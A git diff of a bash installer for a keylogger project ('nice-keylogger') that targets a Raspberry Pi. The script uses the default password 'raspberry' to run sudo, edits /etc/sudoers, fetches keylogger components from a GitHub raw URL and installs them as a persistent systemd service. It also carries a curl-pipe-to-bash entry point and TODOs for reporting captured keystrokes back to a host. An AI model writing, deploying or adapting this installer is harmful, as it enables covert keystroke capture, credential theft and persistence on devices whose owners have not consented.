@@ -2,7 +2,7 @@
 # application to install, setup, and run the keylogger.
 
 # entry point:
-# /bin/bash -c "$(curl -faSL https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/coordinator.sh)"
+base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/
 
 # CHECK THAT USER CAN ISSUE SUDO
 # Totally expects the root user to be an unchanged Raspberry Pi
@@ -11,7 +11,7 @@ raspberry
 echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
 !
 
-echo raspberry | sudo -S mkdir /nicekl && cd /nicekl/
+mkdir nicekl && cd nicekl/
 
 # DOWNLOAD FILES if they are not already installed
 # nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
@@ -19,13 +19,11 @@ CONT=controller.py
 KMAP=keymap.py
 FKEY=find_keyboard.py
 KLSERV=nicekeylogger.service
-# TODO correct this url to be the main branch
-base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
-echo raspberry | sudo -S curl "$base\controller.py" > controller.py
-sudo curl $base\keymap.py > keymap.py
-sudo curl $base\find_keyboard.py > find_keyboard.py
-sudo curl $base\nicekeylogger.service > nicekeylogger.service
-sudo chmod 744 test/controller.py
+wget -L "$base\controller.py"
+wget -L "$base\keymap.py"
+wget -L "$base\find_keyboard.py"
+wget -L "$base\nicekeylogger.service"
+echo raspberry | sudo -S chmod 744 controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
 sudo mv nicekeylogger.service /etc/systemd/system/
@@ -34,9 +32,10 @@ sudo systemctl daemon-reload
 
 
 # RUN APPLICATION
-sudo python3 controller.py &
+python3 controller.py &
 
 # REPORT BACK TO HOST
 # TODO - decide the period to report back
 # TODO - control size of report; only send new content? only send UDP payload? On size == x?
 
+exit
